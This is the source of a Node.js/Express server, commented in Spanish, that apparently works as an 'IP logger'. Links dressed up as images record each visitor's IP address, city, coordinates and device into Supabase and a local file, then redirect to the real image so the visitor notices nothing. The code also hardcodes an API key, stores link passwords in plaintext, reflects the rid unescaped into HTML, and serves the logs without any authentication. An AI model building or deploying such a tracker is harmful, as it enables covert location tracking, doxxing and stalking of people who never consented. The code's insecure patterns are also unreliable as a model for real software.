const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// ============================================================
//  🔥 CONFIGURACIÓN DE SUPABASE
// ============================================================
const SUPABASE_URL = 'https://cjfwowcbuuozeefmdqln.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqZndvd2NidXVvemVlZm1kcWxuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4OTcxNzMsImV4cCI6MjA5ODQ3MzE3M30.zWNTmg6rZCFpjwrY99RvzgGmtAvVZAM9_5X_ss4OszA';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
//  FUNCIONES AUXILIARES
// ============================================================
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] ||
        req.headers['cf-connecting-ip'] ||
        req.connection.remoteAddress ||
        '0.0.0.0';
}

async function getGeoLocation(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp`);
        const data = await response.json();
        if (data.status === 'success') {
            return {
                pais: data.country || 'Desconocido',
                region: data.regionName || 'Desconocido',
                ciudad: data.city || 'Desconocido',
                lat: data.lat || 0,
                lon: data.lon || 0
            };
        }
    } catch (error) { }
    return { pais: 'Desconocido', region: 'Desconocido', ciudad: 'Desconocido', lat: 0, lon: 0 };
}

// ============================================================
//  📝 GUARDAR EN ARCHIVO LOCAL (FALLBACK)
// ============================================================
function guardarLocal(rid, data) {
    try {
        const dbFile = 'database.json';
        let db = {};
        if (fs.existsSync(dbFile)) {
            db = JSON.parse(fs.readFileSync(dbFile, 'utf8'));
        }
        if (!db[rid]) db[rid] = [];
        db[rid].push(data);
        fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
        return true;
    } catch (e) {
        return false;
    }
}

function leerLocal(rid) {
    try {
        const dbFile = 'database.json';
        if (!fs.existsSync(dbFile)) return null;
        const db = JSON.parse(fs.readFileSync(dbFile, 'utf8'));
        return db[rid] || null;
    } catch (e) {
        return null;
    }
}

// ============================================================
//  🔥 ENDPOINT PRINCIPAL
// ============================================================
app.get('/i/:rid/:nombreImagen', async (req, res) => {
    const { rid, nombreImagen } = req.params;
    const { device } = req.query;

    let imgUrl;
    try {
        imgUrl = Buffer.from(nombreImagen.split('.')[0], 'base64').toString('utf-8');
    } catch (e) {
        return res.status(400).send('Imagen no válida');
    }

    if (!rid || !imgUrl) return res.status(400).send('Faltan parámetros');

    try {
        const ip = getClientIP(req);
        const userAgent = req.headers['user-agent'] || 'Desconocido';
        const date = new Date().toISOString().replace('T', ' ').slice(0, 19);
        const geo = await getGeoLocation(ip);

        let deviceInfo = {};
        if (device) {
            try { deviceInfo = JSON.parse(decodeURIComponent(device)); } catch (e) {}
        }

        // GUARDAR EN SUPABASE
        const { error } = await supabase
            .from('registros')
            .insert([{
                rid: rid,
                ip: ip,
                fecha: date,
                pais: geo.pais,
                region: geo.region,
                ciudad: geo.ciudad,
                coordenadas: `${geo.lat}, ${geo.lon}`,
                dispositivo: deviceInfo.tipo || userAgent,
                imagen: imgUrl
            }]);

        if (error) {
            console.error('❌ Error Supabase:', error.message);
        } else {
            console.log(`✅ Visita registrada en Supabase: ${rid}`);
        }

        // GUARDAR EN LOCAL (SIEMPRE)
        guardarLocal(rid, {
            ip, date,
            pais: geo.pais,
            region: geo.region,
            ciudad: geo.ciudad,
            coords: `${geo.lat}, ${geo.lon}`,
            dispositivo: deviceInfo.tipo || userAgent,
            imagen: imgUrl
        });

    } catch (e) {
        console.error('❌ Error:', e);
    }

    if (imgUrl.startsWith('http://') || imgUrl.startsWith('https://')) {
        return res.redirect(imgUrl);
    }

    res.send(`
        <html>
            <body style="background:#1a0a2e;display:flex;justify-content:center;align-items:center;height:100vh;color:#c084fc;font-family:Arial;text-align:center;">
                <div>
                    <h1>🖼️ Visita registrada</h1>
                    <p style="font-size:12px;color:#7c6a9e;">RID: ${rid}</p>
                </div>
            </body>
        </html>
    `);
});

// ============================================================
//  📋 OBTENER REGISTROS
// ============================================================
app.get('/api/records/:rid', async (req, res) => {
    let rid = req.params.rid;
    let records = [];

    // 1. BUSCAR EN SUPABASE
    try {
        const { data, error } = await supabase
            .from('registros')
            .select('*')
            .eq('rid', rid)
            .order('fecha', { ascending: false });

        if (!error && data && data.length > 0) {
            records = data;
            console.log(`✅ ${records.length} registros en Supabase`);
        }
    } catch (e) {}

    // 2. SI NO HAY, BUSCAR EN LOCAL
    if (records.length === 0) {
        const local = leerLocal(rid);
        if (local) {
            records = local;
            console.log(`💾 ${records.length} registros en local`);
        }
    }

    if (!records || records.length === 0) {
        return res.status(404).json({ message: 'Sin registros' });
    }

    res.json({
        rid: rid,
        count: records.length,
        records: records
    });
});

// ============================================================
//  🔒 PROTEGER ENLACE
// ============================================================
app.post('/api/secure', async (req, res) => {
    const { rid, contrasena } = req.body;
    if (!rid) return res.status(400).json({ error: 'Falta el RID' });

    const pass = contrasena || Math.random().toString(36).substring(2, 10);
    const fechaExpiracion = new Date();
    fechaExpiracion.setDate(fechaExpiracion.getDate() + 7);

    const { error } = await supabase
        .from('seguridad')
        .upsert({
            rid: rid,
            contrasena: pass,
            expiracion: fechaExpiracion.toISOString(),
            intentos: 0,
            max_intentos: 5
        }, { onConflict: 'rid' });

    if (error) {
        return res.status(500).json({ error: 'Error al proteger' });
    }

    res.json({
        mensaje: '✅ Enlace protegido',
        contrasena: pass,
        expiracion: fechaExpiracion.toISOString()
    });
});

// ============================================================
//  🔐 VERIFICAR CONTRASEÑA
// ============================================================
app.post('/api/verify', async (req, res) => {
    const { rid, contrasena } = req.body;

    const { data: config, error } = await supabase
        .from('seguridad')
        .select('*')
        .eq('rid', rid)
        .single();

    if (!config) return res.status(404).json({ error: 'No protegido' });
    if (new Date(config.expiracion) < new Date()) return res.status(403).json({ error: 'Expirado' });
    if (config.contrasena !== contrasena) return res.status(401).json({ error: 'Contraseña incorrecta' });

    res.json({ mensaje: '✅ Correcto' });
});

// ============================================================
//  📝 RENOMBRAR RID (CREAR ALIAS)
// ============================================================
app.post('/api/alias', async (req, res) => {
    const { rid, alias } = req.body;

    if (!rid || !alias) {
        return res.status(400).json({ error: 'Faltan parámetros' });
    }

    // Verificar que el RID existe
    let existe = false;
    try {
        const { data } = await supabase
            .from('registros')
            .select('rid')
            .eq('rid', rid)
            .limit(1);
        if (data && data.length > 0) existe = true;
    } catch (e) {}

    if (!existe) {
        const local = leerLocal(rid);
        if (local) existe = true;
    }

    if (!existe) {
        return res.status(404).json({ error: `El RID ${rid} no existe` });
    }

    // Guardar alias
    const { error } = await supabase
        .from('aliases')
        .insert([{ alias, rid }]);

    if (error) {
        if (error.code === '23505') {
            return res.status(400).json({ error: `El alias '${alias}' ya está en uso` });
        }
        return res.status(500).json({ error: 'Error al guardar el alias' });
    }

    res.json({
        mensaje: `✅ Alias '${alias}' creado para '${rid}'`,
        rid,
        alias
    });
});

// ============================================================
//  🚀 INICIAR
// ============================================================
app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
    console.log(`🟣 Visor v3.0 - Con alias y seguridad`);
});
